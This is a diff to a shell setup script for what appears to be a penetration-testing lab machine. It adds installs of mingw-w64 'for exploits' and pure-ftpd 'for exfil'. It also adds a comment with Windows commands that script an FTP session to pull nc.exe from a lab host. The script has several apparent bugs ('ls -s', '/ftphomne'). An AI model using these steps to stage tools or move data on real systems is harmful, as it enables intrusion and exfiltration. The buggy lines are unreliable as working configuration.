@@ -1,5 +1,13 @@
 #!/bin/sh
+ftp=0
 
+while [ "$1" != "" ]; do
+    case $1 in 
+        --ftp )     shift
+                    ftp=1
+                    ;;
+    esac
+done
 red='\e[1;31m'
 grn='\e[1;32m'
 yel='\e[1;33m'
@@ -215,6 +223,49 @@ echo $end
         # apt-get install asciio
     # fi
 
+    if ! sudo apt-get -qq install mingw-w64; then
+        echo $yel [+]$end Installing mingw-w64 complier for exploits
+        apt-get install mingw-w64
+    fi
+
+    if [ $ftp -eq 1 ] ; then
+        echo $grn [+]$end Installing pure-ftpd for exfil
+
+        if ! sudo apt-get -qq install pure-ftpd; then
+            echo $yel [+]$end Installing pure-ftpd for exfil
+            apt-get install pure-ftpd
+        fi
+
+echo $grn [+]$end creating pure-ftpd setup script
+cat << "EOF" > ~/bin/setup-ftp.sh
+#!/bin/bash
+
+groupadd ftpgroup
+useradd -g ftpgroup -d /dev/null -s ftpuser
+pure-pw useradd offsec -u ftpuser -d /ftphome
+pure-pw mkdb
+cd /etc/pure-ftpd/auth
+ls -s ../conf/PureDB 60pdb
+mkdir -p /ftphome
+chown -R ftpuser:ftpgroup /ftphomne
+/etc/init.d/pureftpd restart
+
+
+#############################################################################
+# from within windows you could create a file to feed the ftp server
+# echo open 10.11.0.5  21 > ftp.txt
+# echo user offsec >> ftp.txt
+# echo ftp >> ftp.txt
+# echo bin >> ftp.txt
+# echo GET nc.exe >> ftp.txt
+# echo bye >> ftp.txt
+# ftp -v -n -s:ftp.txt
+#############################################################################
+
+EOF
+chmod 755 ~/bin/setup-ftp.sh
+    fi
+
     if ! [ -d ~/.vim/bundle/vundle ]; then
 	git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle
     fi
@@ -224,6 +275,7 @@ echo $end
         mkdir ~/.ssh
         chmod 700 ~/.ssh
     fi
+
     if [ ! -f ~/.ssh/config ]; then
         echo $grn [*]$end Creating basic .ssh/config file for netivim
 cat << "EOF" >> ~/.ssh/config
@@ -239,11 +291,8 @@ Host dmza
 EOF
     fi
 
-
-
-    echo $wht [*]$end Checking for basic .ssh/config file
     if [ ! -f ~/bin/mount-vmware-shares.sh ]; then
-    echo $grn [*]$end creating  basic .ssh/config file
+    echo $grn [*]$end creating vmware share script
 cat << "EOF" > ~/bin/mount-vmware-shares.sh
 vmware-hgfsclient | while read folder; do
     echo "[+] Mounting ${folder} (/mnt/hgfs/${folder})"
